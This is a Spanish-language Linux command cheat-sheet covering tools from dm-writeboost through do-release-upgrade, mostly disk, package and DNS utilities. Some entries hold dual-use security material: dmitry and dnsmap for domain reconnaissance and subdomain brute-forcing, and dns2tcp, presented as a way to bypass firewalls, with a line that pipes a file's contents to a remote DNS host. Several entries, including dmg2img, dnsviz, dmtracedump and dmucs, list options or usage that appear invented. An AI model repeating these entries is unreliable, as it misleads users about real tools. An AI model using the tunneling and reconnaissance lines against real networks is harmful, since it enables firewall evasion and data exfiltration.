Almacenamiento en caché estructurado en registros para Linux. Es un controlador de E/S a nivel de SO que crea registros a partir de las escrituras entrantes de datos y metadatos y luego escribe los registros de manera secuencial, de manera similar a un sistema de archivos estructurado en registros. Este paquete proporciona un módulo de kernel DKMS para Linux Kernel 3.10+. El archivo de configuración está en /usr/src/dm-writeboost-2.2.17/dkms.conf


dmagnetic
Intérprete para aventuras de texto [inglés] clásicas con gráficos en modo ASCII, específicamente para los juegos de Magnetic Scrolls, una compañía famosa por sus aventuras interactivas de los años 80. Los juegos son "The Pawn", "The Guild of Thieves", "Fish!", "Myth", "Jinxter", "Corruption" y "Wonderland". dmagnetic necesita que se pase los archivos de juego [imágenes de disco o archivos de datos] para funcionar. Los juegos originales están en formato Magnetic Scrolls, generalmente .mag o .dat. Descargar las carpetas con los archivos de cada juego de https://msmemorial.if-legends.org/magnetic.php.
$ dMagnetic -mag pawnall/pawn.mag (especifica el archivo de entrada con los datos del juego)
$ dMagnetic -mag guildall/guild.mag -r ansi -c 16 (jugar con gráficos en modo ANSI y una paleta de colores básica)
Comandos básicos dentro del juego:
         look: Observa el entorno actual.
         inventory: Mostrar los objetos que se lleva.
         go north/south/east/west: Desplazarse en una dirección.
         get [objeto]: Recoge un objeto.
         use [objeto]: Utiliza un objeto.


dmarc-cat
Decodificar informes DMARC [Domain-based Message Authentification Reporting and Conformance]. Esta utilidad decodifica los informes XML estándar enviados por los proveedores al registro RUA [Reporting URI for Aggregate] que son una colección de datos separados, reunidos en un único informe, configurado en DMARC que es un protocolo de autenticación de correo electrónico. Resulta útil para interpretar informes que de otro modo serían muy difíciles de leer. Los informes RUA de DMARC proporcionan a los propietarios de dominios información sobre la gestión de sus mensajes salientes.
$ dmarc-cat report.zip (mostrará el contenido del informe DMARC compromido en formato legible)
$ dmarc-cat report.xml (decodificar directamente un archivo XML)
$ dmarc-cat *.zip (procesará todos los archivos .zip en el directorio actual y mostrará el contenido de cada uno)
$ dmarc-cat report.zip | grep 'ip-address' (extraer solo las direcciones IP reportadas en los informes)


dmesg
Imprimir en pantalla los mensajes del kernel
$ dmesg | grep -i 'error'   (lista los errores del kernel)
$ dmesg | grep hd           (inf sobre dispositivos IDE.)
$ dmesg -c (Limpiar el registro)
$ dmesg -T (Que muestre la hora)


dmeventd
Demonio que forma parte del sistema de administración de volúmenes lógicos [LVM] en Linux. Su función principal es gestionar eventos relacionados con los dispositivos mapeados [devmapper], lo que incluye la detección de cambios en los dispositivos de almacenamiento y la respuesta a estos cambios.
Ejemplo básico de configuración podría ser:
      event {
          # Configuración del evento
          type = "all"  # Monitorear todos los eventos
          action = "/usr/local/bin/manejo_evento.sh"  # Script a ejecutar
      }
El script que se ejecutará cuando dmeventd detecte un evento podría contener:
#  nano manejo_evento.sh
      #!/bin/bash
      echo "Evento detectado: $1" >> /var/log/dmeventd.log
      # Aquí puedes agregar más lógica para manejar el evento
      #
# chmod +x /usr/local/bin/manejo_evento.sh (dar permisos de ejecución al script)
# dmeventd (iniciar dmeventd)
Una vez que dmeventd esté en funcionamiento, comenzará a monitorear los volúmenes lógicos y ejecutará el script de manejo de eventos cuando se detecten cambios.


dmg2img
Herramienta para convertir archivos DMG [Disk Image] comprimidos de apple en imágenes HFS+ estándar sin necesidad de usar software específico de Mac.
$ dmg2img archivo.dmg (creará un archivo .img que contiene el contenido extraído del DMG)
$ dmg2img --extract /path/to/directory archivo.dmg (extraer solo ciertos directorios o archivos)
$ dmg2img --list archivo.dmg (verificar el contenido de un archivo DMG sin extraerlo)
$ dmg2img --create nueva_imagen.img /ruta/a/extraer (crear un nuevo archivo DMG desde una imagen HFS+)


dmidecode
Muestra toda la información de la máquina directamente de la BIOS
# dmidecode -t (muestra los elementos sobre los que se puede solicitar)
# dmidecode -s (Muestra el listado para afinar más la busqueda de datos)
# dmidecode -t memory | grep Size (muestra la memoria y los slots libres)
# dmidecode -t processor | grep "Core Count"  (número de “cores” reales)
# dmidecode | grep "Current Speed"  (muestra la frecuencia de la RAM)
# dmidecode -t 0  (información sobre la BIOS)
# dmidecode -t 1  (informacion del fabricante: núm serie, producto...)
# dmidecode -t 2 (información sobre la placa base)
# dmidecode -t 4  (información sobre la CPU)
# dmidecode --type=processor | grep -i -A 1 charac (si el procesador es de 32 o 64 bit)
# dmidecode -t memory | grep Maxi | grep Capa (máximo  de memoria soportada)


dmitry
Herramienta de recopilación de información de Deepmagic. DMitry puede encontrar posibles subdominios, direcciones de correo electrónico, información de tiempo de actividad, realizar escaneos de puertos TCP, búsquedas de Whois y más.
$ dmitry example.com (ejecutará todas las funcionalidades disponibles por defecto)
$ dmitry -s example.com (intentará descubrir dominios relacionados con el dominio principal proporcionado)
$ dmitry -e xampl.com (buscar direcciones de correo electrónico asociadas al dominio)
$ dmitry -t example.com (obtener información de tiempo de actividad del dominio o servidor)
$ dmitry -p 80,443 example.com (escanea los puertos 80 [HTTP] y 443 [HTTPS] del dominio)
$ dmitry -w example.com (realiza una búsqueda de información sobre el registro del dominio usando Whois)


dmktools
Herramienta para manipular imágenes de disquetes en formato dmk. Las imágenes DMK son particularmente útiles para preservar y trabajar con discos que contienen datos de controladores específicos o sistemas protegidos contra copia. Algunos esquemas de protección de copia se basan en sectores sin formato o defectuosos en los disquetes. El formato dmk permite que las imágenes de disco contengan configuraciones tan inusuales.
$ empty-dmk file.dmk (crea una nueva imagen DMK vacía)
$ dsk2dmk file.dsk file.dmk (crea una nueva imagen DMK y la inicializa con el contenido de un archivo DSK)
$ svi2dmk file.dsk file.dmk (crea una nueva imagen DMK y la inicializa con el contenido de un archivo especial)
$ combine-dmk (lee una serie de archivos nombrados DMK-tt-h.DAT, donde tt es el número de pista y h es la cabeza, y crea una imagen DMK llamada out.dmk, inicializada con los datos de esos archivos)
$ analyze-dmk file.dmk (lee una imagen DMK y imprime estadísticas sobre ella en la salida estándar)


dmrc
En algunas ocasiones al iniciar ubuntu aparece la siguiente nota:
su archivo $HOME/.dmrc no tiene los permisos adecuados y sera ignorado. Esto causara que la sesion e idioma predeterminado no se guarden. El archivo deberia pertener al usuario y tener los permisos 644
Para solucionarlo:
# chmod 700 /home/usuario
# chmod 644 /home/usuario/.dmrc


dmrconfig
Utilidad de configuración para radios DMR [Digital Mobile Radio] para programar radios digitales a través de un cable de programación USB.
# dmrconfig -l (radios soportadas)
# dmrconfig -r (detectar radio conectada usb)


dmsetup
Linux Kernel Device Mapper es la implementación del equipo LVM [Logical Volume Management] de un controlador minimalista de espacio de kernel que maneja la administración de volúmenes, mientras conserva el conocimiento de la disposición del dispositivo subyacente en el espacio de usuario. Esto lo hace útil no solo para LVM, sino también para RAID de software y otros controladores que crean dispositivos de bloque "virtuales". Incluye las herramientas blkdeactivate, y dmstats
$ dmsetup ls (muestra los dispositivos de bloque mapeados)
$ dmsetup ls --tree (muestra una vista jerárquica de los dispositivos mapeados)
$ dmsetup table lvm-myvg-mylv (ver la tabla de mapeo de un dispositivo)
$ echo "0 2097152 linear /dev/sda 2048" | dmsetup create mydevice (crea el dispositivo /dev/mapper/mydevice que mapea los primeros 2097152 bloques de /dev/sda, comenzando en el bloque 2048)
$ dmsetup info mydevice (muestra información sobre el dispositivo, como el tamaño, estado y dependencias)
$ dmsetup remove mydevice (desmonta y elimina el dispositivo)
$ dmsetup status mydevice (ver el estado del dispositivo)


dmtracedump
herramienta que se utiliza para analizar y visualizar el rendimiento de aplicaciones Java mediante la generación de diagramas gráficos en forma de árbol de la pila de llamadas. Cada nodo del árbol representa una llamada a un método, lo que facilita la identificación de cuellos de botella y problemas de rendimiento en el código. Para usar dmtracedump, generalmente se debe haber ejecutado una aplicación Java y haber generado un archivo de traza [trace file] que contenga la información de las llamadas a métodos.
$ java -javaagent:/ruta/a/dmtcp-agent.jar -jar tu-aplicacion.jar
Una vez se tenga el archivo de traza, se puede usar dmtracedump para analizarlo y generar el diagrama.
$ dmtracedump -f tu-archivo-de-traza.dmt
Suponiendo un archivo de traza con las siguientes llamadas a métodos:
           Main.main()
             -> A.methodA()
                -> B.methodB()
                -> C.methodC()
             -> D.methodD()
El árbol generado por dmtracedump podría verse así:
           Main.main()
            ├─ A.methodA()
            │  ├─ B.methodB()
            │  └─ C.methodC()
            └─ D.methodD()


dmtx-utils
Utilidades para leer y escribir códigos de barras Data Matrix 2D. Utilidades de línea de comandos para leer y escribir códigos de barras Data Matrix 2D, símbolos bidimensionales que contienen un patrón denso de datos con corrección de errores incorporada. Incluye las herramientas dmtxquery, dmtxread y dmtxwrite
$ echo -n "linux es un sistema genial" | dmtxwrite -o codigo.png (guarda el código de barras de la frase como codigo.png)
$ dmtxwrite -p archivo.txt (muestra el codigo de barras en la terminal)
$ dmtxwrite -s 80x80 -p -e 8 archivo.txt (80x80, por pantalla y codigo base 256)
$ dmtxwrite -l (lista de formatos de imagen admitidos)


dmucs
Es un sistema de gestión de compilaciones distribuido que permite a un grupo de usuarios compartir recursos de compilación en una "granja de compilación". Esto significa que cuando un usuario solicita una compilación, el sistema selecciona automáticamente la máquina más adecuada (es decir, la más rápida y disponible) para llevar a cabo esa tarea. Esto es especialmente útil en entornos donde se realizan compilaciones grandes y complejas, ya que optimiza el uso del hardware y reduce los tiempos de espera. Antes de usar dmucs, es necesario tener un entorno configurado con varias máquinas que puedan actuar como nodos de compilación. Esto implica tener el software de dmucs instalado y configurado en cada máquina.
$ dmucs build mi_proyecto (enviará la solicitud a la granja de compilación, y dmucs se encargará de direccionar la tarea a la máquina más rápida disponible)
$ dmucs status (mostrará una lista de todas las compilaciones en curso, completadas y cualquier error que haya ocurrido)
$ dmucs cancel <ID_de_compilación> (cancelar una compilación)


dnf
Sistema de administración de paquetes predeterminado en la mayoría de distribuciones basadas en RPM.
# dnf upgrade (actualizar listado)
# dnf group list (listar todos los grupos de paquetes)
# dnf group info "nombre grupo" (información de un grupo)
# dnf group install "nombre grupo" (instalar todos los paquetes de un grupo)
# dnf group remove "nombre grupo" (eliminar un grupo de paquetes)
# dnf list all (listar todos los paquetes instalados y disponibles)
# dnf list installed (listar todos los instalados)
# dnf list available (listar todos los disponibles)
# dnf list available paquete (ver todos los paquetes relacionados con "paquete" disponibles)
# dnf info paquete (buscar información sobre "paquete")
# dnf search paquete (buscar paquete)
# dnf install paquete (instalar "paquete")
# dnf remove paquete (desinstalar "paquete")
# dnf install paquete1 paquete2 paquete3 (instalar varios paquetes)


dns
El servidor DNS traduce los numeros ip a nombres inteligibles para los seres humanos. Estos servicios estan vinculados a los ISP, es decir, a nuestros proveedores de acceso a Internet. Sin embargo estas ips pueden ser modificadas para conseguir mejores rendimientos o por manias personales con algunas opciones mas libres o profesionales. La manera de saber si el servidor DNS responde correctamente es hacer un ping consistente en enviar una pequeña cantidad de información al servidor y medir la velocidad en milisegundos de la respuesta. Valores inferiores a 70 ms (Al final de la linea [time=62.9 ms]) son razonables:
$ ping -c 3 8.8.8.8
Algunas opciones a las ofrecidas por nuestras ISP:
	Google -> 8.8.8.8,	8.8.4.4
	OpenDNS -> 208.67.222.222, 208.67.220.220
	Level3 -> 4.2.2.1, 4.2.2.2, 4.2.2.3, 4.2.2.4, 4.2.2.5 y 4.2.2.6
	Dyn -> 216.146.35.35, 216.146.36.36
	DNSadvantage -> 156.154.70.1, 156.154.71.1
Ona vez escogidas las DNSs:
# nano /etc/resolv.conf
Colocar:
	nameserver 4.2.2.1
	nameserver 4.2.2.2
Nota.- Comentar o borrar las existentes.
Para evitar que network-manager sobreescriba el archivo resolv.conf, bloquear el fichero:
# chattr +i /etc/resolv.conf (Para desbloquearlo -i)


dns2tcp
Servidor y cliente de túnel TCP sobre DNS. La herramienta permite encapsular una conexión TCP dentro de paquetes DNS lo que significa que puede usar los protocolos de red DNS [Domain Name System] para transportar datos de manera anónima o evitar restricciones de firewall.
$ dns2tcp-client -v example.com 53 ssh (conectar a un servidor SSH en el puerto 53 del dominio example.com y en modo verbose)
$ cat archivo.txt | dns2tcp-client example.com 53 > salida.txt (enviar el contenido de archivo.txt al servidor DNS remoto y lo recibe como salida.txt)
$ dns2tcp-proxy --listen=0.0.0.0:9050 --remote=example.com:53 (actuar como un proxy SOCKS5 en el puerto 9050, conectándose al servidor DNS remoto en example.com:53)


dns-browse
Interfaz de usuario para búsquedas DNS. Este paquete proporciona dos programas para realizar búsquedas de usuarios en servidores DNS: dns_tree y dns_browse. dns_tree es una interfaz de usuario basada en línea de comandos para dig. Reemplaza las diversas invocaciones de dig necesarias para obtener una zona y formatea la salida en un estilo jerárquico como un árbol. dns_browse es una interfaz de usuario gráfica para dns_tree. Permite la exploración de DNS con solo apuntar y hacer clic y facilita la expansión/compresión de jerarquías en una o más zonas DNS.
$ dns_tree google.es (mostrará una representación de la estructura de dominios de google.es)


dns-flood-detector
Detecta niveles de uso abusivos en servidores de nombres con mucho tráfico y el demonio emitirá una alarma a través de syslog. Fue desarrollado para detectar niveles de uso abusivos en servidores de nombres con mucho tráfico y para permitir una respuesta rápida para detener el uso de un servidor de nombres para facilitar el correo no deseado.
$ dns-flood-detector -i eth0 -t 10 (con el demonio activado, comenzará a monitorear el tráfico DNS en la interfaz eth0 y mostrará alarma a partir de 10 consultas por seundo)
$ dns-flood-detector -i eth0 -d (muestra las estadísticas directamente en la consola)
$ dns-flood-detector -i eth0 -b 10240 (configurar un mayor tamaño del búfer para análisis detallado)
$ tail -f /var/log/syslog (por defecto las estadísticas y alertas se escriben en /var/log/syslog)


dnscache
Herramienta que almacena respuestas a consultas DNS y las devuelve rápidamente para evitar consultas repetidas a servidores DNS externos.


dnscap
Utilidad similar a tcpdump, de captura de red diseñada específicamente para analizar el tráfico DNS. Produce datos binarios en formato pcap, lo cual facilita su posterior análisis con otras herramientas como Wireshark.
# dnscap -i eth0 -w dns_capture.pcap (captura el tráfico DNS en la interfaz eth0 y guarda los resultados en un archivo llamado dns_capture.pcap)
# dnscap -i eth0 -w example.com_capture.pcap 'host.example.com' (captura solo el tráfico DNS relacionado con el dominio host.example.com)
# dnscap -i eth0 -n (muestra el tráfico DNS en tiempo real)
# dnscap -i eth0 -w dns_capture.pcapng (captura y guarda en formato pcapng que es un formato más moderno y eficiente que pcap)
# dnscap-rssm-rssac002 --no-recompile (se deshabilitó la combinación y la eliminación de métricas específicas de este complemento)


dnscrypt
Cifrar el tráfico DNS.
$ wget https://github.com/downloads/opendns/dnscrypt-proxy/dnscrypt-proxy-1.2.0.tar.gz
$ tar xvvf dnscrypt-proxy-1.2.0.tar.gz
$ cd dnscrypt-proxy-1.2.0/
$ ./configure
$ make
# make install
# dnscrypt-proxy --daemonize (Arrancar el demonio)
Modificar las DNSs en:
# nano /etc/resolv.conf
Colocar:
nameserver 127.0.0.1
Nota.- Comentar las existentes.
Para evitar que network-manager sobreescriba el archivo resolv.conf, bloquear el fichero:
# chattr +i /etc/resolv.conf (Para desbloquearlo -i)


dnsdiag
Herramientas [dnseval, dnsping y dnstraceroute] para realizar auditorías básicas de solicitudes y respuestas DNS.
$ dnsping google.es (como el "ping" clásico)
$ dnseval -c 5 google.es (envia 5 solicitudes de consulta DNS arbitraria a una lista determinada de servidores DNS)
$ dnstraceroute google.com (averiguar la ruta que sigue una solicitud DNS para llegar a su destino)


dnsdist
Balanceador de carga DNS [Domain Name System]. Herramienta de balanceo de carga para tráfico DNS con gran capacidad de detección de ataques DoS y abusos del servicio DNS. Recibe consultas DNS y las distribuye de manera eficiente a uno o más servidores DNS, garantizando que los servidores lentos o sobrecargados reciban menos consultas.
# dnsdist --local 127.0.0.1:5353 --backend 192.168.1.1:53 --backend 192.168.1.2:53 (las consultas entrantes en local y el puerto 5353 se balancearán entre 192.168.1.1 y 192.168.1.2)
1.-
Balanceo de carga con detección de servidores lentos
# dnsdist -e
> newServer("192.168.1.1", { order = 1, qps = 100 })
> newServer("192.168.1.2", { order = 2, qps = 50 })
> setServerPolicy("leastOutstanding")
> addAction(RegexRule(".*google.com"), DropAction())
             newServer: añade servidores backend con una prioridad específica (order) y una limitación de consultas por segundo (qps).
             setServerPolicy("leastOutstanding"): utiliza la política de balanceo basada en el servidor con menos consultas pendientes.
             addAction: añade una regla para bloquear las consultas a google.com.
2.-
Configurar dnsdist para detectar y bloquear ataques DoS
# dnsdist -e
> addDynBlockRule(ExceededQPS(50), 60)
             addDynBlockRule: crea una regla dinámica para bloquear IPs que envíen más de 50 consultas por segundo [QPS] durante 60 segundos.
3.-
Reenviar consultas solo a servidores específicos
# dnsdist -e
> addAction(RegexRule(".*example.com"), PoolAction("pool1"))
> newServer("192.168.1.10", { pool = "pool1" })
             Crea un grupo (pool1) para consultas dirigidas a example.com.
             Sólo el servidor 192.168.1.10 manejará dichas consultas.
4.-
Supervisar el estado del tráfico
# dnsdist -e
> showServers()
> showQPS()
> topQueries()
            showServers(): muestra el estado actual de los servidores backend (latencia, consultas, etc.).
            showQPS(): muestra las consultas por segundo.
            topQueries(): muestra las consultas más frecuentes.


dnsdomainname
Muestra el nombre del dominio DNS del sistema.
$ dnsdomainname


dnsenum
[cpanminus libnet-dns-perl libnet-netmask-perl libxml-writer-perl]. Herramienta diseñada con el propósito de consultar los servidores DNS de un dominio. Descarga: <https://github.com/fwaeytens/dnsenum> . Previamente lanzar:
# cpanm String::Random
# perl dnsenum.pl URL
# perl dnsenum.pl --noreverse -o resultado.xml URL (Evitar operaciones de búsqueda inversa y guardando el resultado en un fichero)


dnseval
[dnsdiag]. Evalúa múltiples resoluciones de DNS y ayuda a elegir el mejor servidor DNS para su red. Se recomienda utilizar su propio dispositivo de resolución de DNS en lugar de un servidor DNS de terceros, pero en caso de que necesite elegir el mejor reenviador de DNS para su red, dnseval le permite comparar diferentes servidores DNS en relación al rendimiento, lae latencia y la fiabilidad.
# dnseval -T facebook.com (forma básica)
# dnseval -t A -f public-servers.txt -c 20 yahoo.com (Clase de registro "A", de una lista de servicios DNS y 20 solicitudes a enviar a yahoo.com)


dnshistory
Traducción y almacenamiento de direcciones IP de archivos de registro. Proporciona un medio para almacenar un historial de cambios de DNS/nombres para las direcciones IP extraídas de archivos de registro web. El historial se actualiza automáticamente cada vez que se ejecuta el comando.
# dnshistory -D (volcar la base de datos del historial a STDOUT)
# dnshistory -S (muestran una o más direcciones IP y el historial)
# dnshistory -S -d /tmp/data.db 127.0.0.1 192.168.18.6 (ver el historial en dos direcciones IP y guardar en /tmp/data.db)
# cat /var/log/dnshistory/* (ver todo el historial almacenado)


dnsmap
Herramienta que, mediante fuerza bruta, permite obtener los subdominios de un dominio.
$ dnsmap url (forma básica)
$ dnsmap url -w words.txt -r resultado.txt (Usando un diccionario [w] y derivando el resultado a un fichero [r])
Nota.- Descarga de diccionarios en <http://packetstormsecurity.org/Crackers/wordlists/dictionaries/>


dnsmasq
[daemon]. Es un servidor DHCP y reenviador DNS. Está diseñado para proporcionar DNS y, opcionalmente, DHCP, a una red pequeña.
Para que el ordenador guarde en cache las páginas visitadas y no vuelva a resolver las ips con el servidor DNS:
# gedit /etc/resolv.conf
Independientemente de que existan más lineas indicando otras ips, añadir la siguiente:
nameserver 127.0.0.1
Y para distribuir la carga entre varios servidores, añadir la linea:
options timeout:1 rotate attempts:1
Comprobar el correcto funcionamiento:
$ dig tuxapuntes.com | grep Query
;; Query time: 369 msec
Volver a lanzar dig:
$ dig tuxapuntes.com | grep Query
;; Query time: 0 msec
Si nuestra IP es dinámica, NetworkManager nos modificará cada cierto tiempo el archivo /etc/resolv.conf, para substituir el creado automaticamente por el nuestro:
# cp /etc/resolv.conf /etc/resolv.conf.local (Asegurándonos que este último tiene la linea “nameserver 127.0.0.1”)
# crontab -e
*/3 * * * * cp /etc/resolv.conf.local /etc/resolv.conf (actualizar cada 3 minutos)


dnsmasq-base
Servidor proxy DNS de almacenamiento en caché y servidor DHCP/TFTP.
$ dnsmasq --test (comprueba la configuración de dnsmasq)
$ dnsmasq -h (No leer los nombres de host en /etc/hosts)
$ dnsmasq -H mis_hosts (lee /etc/hosts y el archivo especificado. si se pone -h, solo leerá el especificado)
$ dnsmasq --no-daemon --log-queries (inicia sin iniciar el demonio, imprime la salida del comando y registra toda la actividad)


dnsperf
Herramientas para medir el rendimiento de servidores DNS, proporcionando datos de latencia, tasas de respuesta y rendimiento bajo condiciones de alta carga. resperf aumenta sistemáticamente la tasa de consultas y monitorea la tasa de respuesta para simular el almacenamiento en caché de los servicios de DNS. Incluye las herramientas pcap-queryparse, resperf y resperf-report
$ dnsperf -s 192.168.1.1 -d queries.txt -l 30 -c 10 (servidor DNS a probar, archivo con las consultas a enviar, 30 segundo de duración y con 10 conexiones simultaneas)
$ pcap-queryparse -r capture.pcap -o queries.txt (extrae consultas DNS desde un archivo de captura de red [.pcap] y las guarda en el archivo de salida queries.txt)
$ resperf -s 192.168.1.1 -d queries.txt -m (servidor a probar, consultas a enviar y habilita el modo de múltiples consultas por segundo, incrementando la carga progresivamente)
Durante la prueba, resperf muestra estadísticas como la tasa de consultas por segundo, la tasa de respuestas y la latencia media.
$ resperf-report -i resperf.out -o report.html (genera informe gráfico en formato HTML a partir de los resultados obtenidos por resperf en report.html)
El informe incluye gráficos que muestran la relación entre la tasa de consultas y la tasa de respuestas, el tiempo de respuesta promedio, y otros datos útiles para analizar el rendimiento del servidor DNS.
Ejemplo de archivo queries.txt en el que cada línea representa una consulta DNS en el formato "name type class":
        example.com A IN
        example.org MX IN
        example.net AAAA IN
Flujo Completo de Ejemplo:
$ tcpdump -i eth0 -w capture.pcap port 53 (capturar tráfico DNS)
$ pcap-queryparse -r capture.pcap -o queries.txt (extraer consultas)
$ dnsperf -s 8.8.8.8 -d queries.txt -l 60 (medir rendimiento)
$ resperf -s 8.8.8.8 -d queries.txt -m > resperf.out (realizar prueba de estrés)
$ resperf-report -i resperf.out -o report.html (generar informe)


dnsping
[dnsdiag]. Se usa para medir el tiempo de respuesta de un servidor DNS dado para solicitudes arbitrarias. Al igual que una utilidad de ping tradicional, proporciona una funcionalidad similar para las solicitudes de DNS.
# dnsping dnsdiag.org (forma básica)
# dnsping -c 3 -t A -s 8.8.8.8 dnsdiag.org (3 solicitudes de registro "A" usando las DNSs de google)


dnss
Es un demonio para usar DNS sobre HTTPS. Puede actuar como un proxy, recibiendo solicitudes DNS [por defecto, en puerto 53] y resolviéndolas mediante DNS sobre HTTPS [DoH]. Este protocolo permite realizar consultas DNS a través de conexiones HTTPS en lugar de usar el protocolo DNS tradicional, que son en texto plano y vulnerable a interceptaciones. Esto protege las consultas DNS de ser espiadas o modificadas por terceros.
# systemctl start dnss (iniciar dnss como un servicio en segundo plano)
# dnss -monitoring_listen_addr localhost (dirección a escuchar para monitorear solicitudes HTTP)
# dnss -enable_dns_to_https
1.-
Configurar dnss para usar un servidor DoH específico
# nano /etc/dnss.conf
Añadir la linea
       upstream = "https://cloudflare-dns.com/dns-query"
# systemctl restart dnss (reiniciar el servicio)
$ dig @127.0.0.1 example.com (probar que dnss está funcionando enviando una consulta DNS a dnss, que la resolverá mediante DoH)
2.-
Configurar el sistema para usar dnss como servidor DNS
# nano /etc/resolv.conf
Y añadir:
        nameserver 127.0.0.1
Nota: En algunos sistemas, este archivo puede ser sobrescrito automáticamente. Para evitar esto, se puede deshabilitar la modificación automática o usar herramientas como resolvconf.


dnstap-ldns
Utilidad que sirve para decodificar archivos codificados en formato dnstap a formato legible como text plano. Proporciona detalles sobre las consultas y respuestas DNS, como el tipo de mensaje (query, response), la dirección IP del cliente, el nombre de dominio consultado, el tipo de registro DNS (A, AAAA, MX, etc.), y más. Dnstap es un protocolo flexible y eficiente para capturar y registrar el tráfico DNS, y es comúnmente utilizado en servidores DNS como BIND, Knot DNS, y otros.
$ dnstap-ldns -r archivo_dnstap (decodificar e imprimir en la salida estándar)
$ dnstap-ldns -y archivo_dnstap (especifica un formato de salida codificado en YAML)
$ dnstap-ldns -q archivo_dnstap (salida de "texto silencioso")
$ dnstap-ldns -f archivo.dnstap -o salida.txt (lee el archivo archivo.dnstap y muestra su contenido decodificado y lo guarda en salida.txt)
$ dnstap-ldns -f archivo.dnstap -t query (filtra y muestra solo las consultas DNS [queries] del archivo dnstap)
$ dnstap-ldns -f archivo.dnstap -t response (similar al anterior, pero filtra y muestra solo las respuestas DNS)
$ dnstap-ldns -f archivo.dnstap -j (decodifica el archivo y muestra la salida en formato JSON)
1.-
Una salida típica de dnstap-ldns puede verse así:
      2023-10-01T12:34:56.789Z CLIENT_QUERY NOERROR 192.168.1.100:12345 -> 8.8.8.8:53 IN A example.com.
      2023-10-01T12:34:56.790Z CLIENT_RESPONSE NOERROR 8.8.8.8:53 -> 192.168.1.100:12345 IN A 93.184.216.34
El significado de los parámetros es:
      CLIENT_QUERY: Indica una consulta DNS desde el cliente.
      CLIENT_RESPONSE: Indica una respuesta DNS desde el servidor.
      NOERROR: El código de respuesta DNS (en este caso, sin errores).
      192.168.1.100:12345: Dirección IP y puerto del cliente.
      8.8.8.8:53: Dirección IP y puerto del servidor DNS.
      IN A example.com.: Tipo de registro DNS y nombre de dominio consultado.


dnstop
Monitorear el tráfico dns.
# dnstop -i 192.168.1.3 -p -r 2 eth0 (Excluir la propia máquina [i], en modo no promiscuo [p], actualizando cada 2 segundos [r] y la red objetivo)
En la mayoria de los casos, lo normal en lanzar:
# dnstop eth0
Y realizar las consultas de forma interactiva pulsando las siguientes teclas:
	s (visualizar las direcciones de origen)
	d (visualizar las direcciones de destino)
	t (desglosar por tipo)
	r (mostrar el desglose de los códigos de respuesta)
	1 (mostrar consulta de primer nivel [.com, .net, .info])
	2 (mostrar consulta de segundo nivel)
	3 (mostrar consulta de tercer nivel)
	! (mostrar fuente y consulta de primer nivel)
	@ (mostrar fuente y consulta de segundo nivel)
	# (mostrar fuente y consulta de tercer nivel)
	Ctrl + r (Reinicia el contador)
	? (Muestra la ayuda)
	Ctrl + x (Salir)


dnstracer
Consultas DNS desde una ip o un host. dnstracer determina cuando un servidor de nombres de dominio [DNS] obtiene información de un nombre de anfitrión dado, y a continuación el servidor DNS manda la respuesta de autorización.
$ dnstracer host


dnstraceroute
[dnsdiag]. Se utiliza para rastrear la ruta que toma una solicitud DNS de origen al destino. Su propósito es detectar si una solicitud es redirigida o secuestrada. Esto se puede hacer comparando diferentes consultas DNS que se envían al mismo servidor DNS usando dnstraceroute y observar si hay alguna diferencia en la ruta.
# dnstraceroute facebook.com (forma básica)
# dnstraceroute -e -C -t A -s 8.8.4.4 facebook.com (impimiendo las sugerencias de los expertos si eestan disponibles, a todo color y usando las DNSs de google))


dnstwist
Herramienta para detectar posibles ataques de phishing, typosquatting, y monitorizar la seguridad de dominios web. Genera nombres de dominio de apariencia similar para un nombre de dominio determinado, por ejemplo, variaciones por errores tipográficos, y luego realiza consultas DNS para verificar qué dominios están activos y si hay servidores de correo configurados que podrían interceptar correos electrónicos mal dirigidos.
$ dnstwist example.com (generará una lista de dominios similares a example.com y consultará registros DNS A, AAAA, NS, y MX para cada uno de ellos)
$ dnstwist --csv resultados.csv example.com (generará resultados.csv con los resultados detallados, incluyendo las consultas DNS y los dominios activos)
$ dnstwist --ssdeep example.com (comparar el contenido de las páginas web de dominios similares para detectar si hay páginas que podrían ser copias maliciosas)
$ dnstwist --nameservers 8.8.8.8,1.1.1.1 example.com (consultas DNS utilizando los servidores especificados en este caso, Google y Cloudflare)
$ dnstwist --resolvers-only example.com (solo muestra los dominios que tienen una resolución válida a una dirección IP9
$ dnstwist --monitor example.com (monitorizar continuamente el dominio y recibir actualizaciones cuando se detecten cambios)


dnsvi
Editar zonas DNS dinámicas con vi. dnsvi es una interfaz para nsupdate. Dado un nombre de zona DNS, utiliza dig -t AXFR para obtener todos los registros de una zona. Luego, genera su editor favorito y, una vez completado, crea una lista de instrucciones "update add" y "update delete" para enviar a nsupdate [ver].
$ dnsvi ejemplo.com (editar los registros de la zona DNS ejemplo.com. El comando dig -t AXFR ejemplo.com se ejecuta en segundo plano para obtener los registros DNS actuales)
Luego se abrirá el editor vi con el contenido de la zona DNS. Aquí se puede realizar cambios como agregar, modificar o eliminar registros. Al guardar y salir: Una vez que se termina de editar, se guarda los cambios y se sale de vi. En este punto, dnsvi procesará los cambios. Finalmente, para enviar enviar estas instrucciones al servidor DNS para aplicar los cambios. El comando sería algo como:
$ nsupdate -k /path/to/keyfile
O, si no se requiere autenticación, simplemente:
$ nsupdate


dnsviz
Herramienta para el análisis y visualización del comportamiento del Sistema de nombres de dominio [DNS], incluidas sus extensiones de seguridad [DNSSEC].  Esta basada en la web <http://dnsviz.net/>.
$ dnsviz example.com (información sobre un dominio específico)
$ dnsviz --zone=example.com(analizar los servidores autoritativos de un dominio)
$ dnsviz --dnssec=example.com (verificar la implementación de DNSSEC)
$ dnsviz --simulate=example.com (simular ataques contra un dominio)
$ dnsviz --query-only=example.com (mostrar solo los resultados de consulta)
$ dnsviz --json=example.com > results.json (generar un archivo JSON con los resultados)
$ dnsviz --nameserver=192.168.1.100:53 (configurar un servidor DNS personalizado


dnswalk
Herramienta utilizada para realizar auditorías de zonas DNS. Su propósito principal es verificar la coherencia y precisión de los registros DNS en un dominio específico. Es un depurador de DNS que realiza transferencias de zona de dominios específicos para comprobar la coherencia interna y la precisión de la base de datos.
$ dnswalk example.com (realizará una serie de comprobaciones sobre el dominio example.com, verificando que todos los registros sean correctos y que no haya inconsistencias)
$ dnswalk -n ns1.example.com example.com (indicará que use ns1.example.com como el servidor de nombres para realizar las consultas de la zona)
$ dnswalk sub.example.com (comprobar una subzona específica)
$ dnswalk example.com sub.example.com (comprobaciones en múltiples zonas)


do-release-upgrade
Herramienta para actualizar por consola sistemas basados en Ubuntu a una nueva versión de la distribución. Para configurar si queremos actualizar entre versiones normales o versiones LTS, debemos modificar del fichero /etc/update-manager/release-upgrades la linea:
Para versiones LTS:
Prompt=lts
Para versiones normales:
